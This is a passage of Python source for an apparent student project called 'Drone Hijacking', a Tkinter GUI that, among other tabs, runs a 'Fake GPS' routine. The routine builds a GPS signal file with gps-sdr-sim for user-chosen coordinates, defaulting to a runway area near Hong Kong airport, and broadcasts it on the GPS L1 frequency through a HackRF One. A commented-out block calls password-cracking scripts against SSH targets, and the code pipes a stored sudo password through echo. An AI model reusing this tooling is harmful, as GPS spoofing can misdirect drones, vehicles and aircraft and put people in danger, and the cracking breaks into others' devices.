tab9Remove = Button(tab9, text = "",image=DeletIcon,command=RefershGPSData,
                 background = "black",foreground="red",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab9Remove.place(x=590,y=500, width=42,height=42)

#go to hackrf one page
HackRFOnebt = PhotoImage(file = "Graphic/HackRFOneBt.png")
tab9GoTo8 = Button(tab9, text = "HackRF One",image=HackRFOnebt,command=goTab8,
                 background = "black",foreground="#33ff02",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab9GoTo8.place(x=10,y=500)

def HackRFOneReset():
    for res in os.popen("lsusb |grep OpenMoko"):
        reset = res.split(' ')
        print('HackRF ONE reset CMD:')
        print('cd usbResetTools/;echo '+SuPasswd+' |sudo -S ./usbreset /dev/bus/usb/' + str(reset[1]) +'/' + str(reset[3][:-1]) + '')
        os.system('cd usbResetTools/;echo '+SuPasswd+' |sudo -S ./usbreset /dev/bus/usb/' + str(reset[1]) +'/' + str(reset[3][:-1]) + '')

class FakeGPS:
    def newThread(self):
        threading.Thread(target = self.Task1).start()

    def BackUp(self):
        #backup gps bin file
        time.sleep(1)
        SaveBinSize = int(os.popen("ls gpsTools/gpssim.bin -l |tail -1|awk '{print $5}'").readlines()[0])
        if 1560000000 > SaveBinSize and 1559000000 < SaveBinSize :
            FileName=str(str(Latitude_Ent.get().strip())+'a'+str(Longitude_Ent.get().strip())).replace('.','d')
            os.system('cp -f  gpsTools/gpssim.bin GpsBinSave/'+FileName+'.bin')

    def Task1(self):
        PB_TabNine.start()
        HackRFOneReset()
        FakeGPSLaunch.config(image=SwitchOn,foreground="Green")
        if len(Latitude_Ent.get().strip()) > 0 and len(Longitude_Ent.get().strip()) > 0 and getHackRfStatus() == 'yes':

            Latitude_Ent.configure(state='readonly')            
            Longitude_Ent.configure(state='readonly')
            Address_Ent.configure(state='readonly')

            tab9GoTo8.config(state="disable")
            tab9Remove.config(state="disable")
            tab9GpsRecord.config(state="disable")
            GpsSave.config(state="disable")
            tab9Update.config(state="disable")

            BackUpName = str(FindBackUpGPSBin(Latitude_Ent.get().strip(),Longitude_Ent.get().strip()))
            print(len(BackUpName))
            if len(BackUpName) < 5:
                os.system("pkill notify-osd;notify-send 'Making Fake GPS binary' -i system-run")

                os.system('cd gpsTools/ ;./gps-sdr-sim -b 8 -e This-brdc3510.19n -l '+str(Latitude_Ent.get().strip())+','+str(Longitude_Ent.get().strip())+',100')

                threading.Thread(target = self.BackUp).start()
                
                #if it is not finish will not fake gps
                SaveBinSizex = int(os.popen("ls gpsTools/gpssim.bin -l |tail -1|awk '{print $5}'").readlines()[0])
                if 1560000000 > SaveBinSizex and 1559000000 < SaveBinSizex :
                    os.system("pkill notify-osd;notify-send 'Start to Fake GPS' -i system-run")

                    os.system('cd gpsTools/ ;hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0')
            else:
                os.system("pkill notify-osd;notify-send 'Start to Fake GPS' -i system-run")

                os.system('cd GpsBinSave/ ;hackrf_transfer -t ' + str(BackUpName) + ' -f 1575420000 -s 2600000 -a 1 -x 0')

            os.system("pkill notify-osd;notify-send 'All function are finished' -i system-run")

            tab9GoTo8.config(state="normal")
            tab9Remove.config(state="normal")
            tab9GpsRecord.config(state="normal")
            GpsSave.config(state="normal")
            tab9Update.config(state="normal")

            Latitude_Ent.configure(state='normal')            
            Longitude_Ent.configure(state='normal')
            Address_Ent.configure(state='normal')

        elif getHackRfStatus() != 'yes':
            note.select(tab8)
            messagebox.showwarning("HackRF ONE","Warning, Please make sure you have connect the HackRF One .")

        os.system('echo '+SuPasswd+' |sudo -S rm gpsTools/gpssim.bin')
        FakeGPSLaunch.config(image=SwitchOFF,foreground="Red")
        PB_TabNine.stop()
        FakeGPSLaunch.config(state="normal")

FakeGPSFunction = FakeGPS()



def FakeGPSLaunchFunction():
    if str(FakeGPSLaunch.config()).find('Red') > 0:
        FakeGPSFunction.newThread()
    else:
        FakeGPSLaunch.config(state="disable")
        os.system('pkill gps-sdr-sim')
        os.system('pkill hackrf_transfer')

FakeGPSLaunch = Button(tab9, text = "Launch Fake GPS",image=SwitchOFF,command=FakeGPSLaunchFunction,
                 background = "black",foreground="Red",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
FakeGPSLaunch.place(x=220,y=500)

#default information
RefershGPSData('22.304217','113.912238','South Runway Road, Kau Liu, Tung Chung, Islands District, New Territories, Hong Kong, China')
#####################################
### Tab10 About Drone Hijacking   ###
#####################################

tab10string = "Drone Hijacking"
tab10_intro= Label(tab10,text=tab10string,background="black",foreground="#E0E0E0",
                  font=('microsoft yahei', 70))
tab10_intro.place(x=42,y=73)

class Tab10Label:
    def __init__(self,text,x,y):
        self = Label(tab10,text = text , background="black",foreground="#D6E961",font=("Helvetica", 16, "bold")).place(x=x,y=y)


Tab10Label('Group Member:',42,270)
Tab10Label('1.Sunny Chan  ',42,360)

Tab10Label('Working time: 2019 09 29 - 2020 04 10',42,420)

Tab10Label('Shortcuts:',500,270)
Tab10Label('F1  -> Exit.',500,300)
Tab10Label('F5  -> Shutdown.',500,330)
Tab10Label('F6  -> Restart.',500,360)

Tab10Label('Python Version : 3.5',500,420)

def OpenPasswordMangemenr():
    os.system('python3 PasswordManager.py')
    messagebox.showwarning("Warning","If you want to update the password of this software need to open it again")

AutoComplete = PhotoImage(file = "Graphic/AutoComplete.png")
tab10Update = Button(tab10, text = "Password Manager",image=AutoComplete,command=OpenPasswordMangemenr,
                 background = "black",foreground="yellow",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab10Update.place(x=580,y=500)

####################################################################################################################################
###                                                  Function at the start                                                       ###
####################################################################################################################################
'''
class MegBoxRequest():
    def newThread(self):
        threading.Thread(target = self.Task1).start()
        threading.Thread(target = self.Task2).start()
    def Task1(self):
        try:
            cmd='./CrackPasswdTools/FYP-SSH-Local-Target.sh'
            tar = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
            cmd='./CrackPasswdTools/FYP-SSH-ReturnPasswd.sh'
            pswd = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])

            cmd='grep ' + str(tar).split(' ')[-2][4:].upper() + ' PasswordRecord.txt |tail -1'
            res = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
            if str(pswd)[2:-3] != str(res).split('|')[2][:-3] :
                UpdateNewPassword(str(tar).split(' ')[-2][4:].upper(),str(pswd)[2:-3])
        except:
            print('Not connect to the network')

    def Task2(self):
        os.system('pkill notify-osd')
        time.sleep(0.1)
        subprocess.Popen(['notify-send','Drone Hijacking is running','-i','notification-network-wireless-connected'])


ReqMsg = MegBoxRequest()

def startMegBoxRequest():
    ReqMsg.newThread()

startMegBoxRequest()
'''

####################################################################################################################################
###                                                  Project Title banner                                                        ###
####################################################################################################################################
os.system('clear')
print()
print("  ______                          _   _ _ _            _    _             ")
print("  |  _  \                        | | | (_|_)          | |  (_)            ")
print("  | | | |_ __ ___  _ __   ___    | |_| |_ _  __ _  ___| | ___ _ __   __ _ ")
print("  | | | | '__/ _ \| '_ \ / _ \   |  _  | | |/ _` |/ __| |/ / | '_ \ / _` |")
print("  | |/ /| | | (_) | | | |  __/   | | | | | | (_| | (__|   <| | | | | (_| |")
print("  |___/ |_|  \___/|_| |_|\___|   |_| |_|_| |\__,_|\___|_|\_\_|_| |_|\__, |")
print("                                        _/ |                         __/ |")
print("                                       |__/                         |___/ ")
print()
print("  Group Member:                            Shortcuts:                     ")
print("  1.Alex Wong                              F1  -> Exit.                   ")
print("  2.Cherry Zhang                           F5  -> Shutdown.               ")
print("  3.Sunny Chan                             F6  -> Restart.                ")
print()
print()
print("  Working time   : 2019 09 29 - 2020 04 10                                ")
print()
print("  Python Version : 3.5.2 (default, Oct  8 2019, 13:06:37)                 ")
print("                   [GCC 5.4.0 20160609]                                   ")
print()
print()
####################################################################################################################################
###                                                  Do it when it launch                                                        ###
####################################################################################################################################

getUpdateDataForNetworkCard()

root.mainloop()

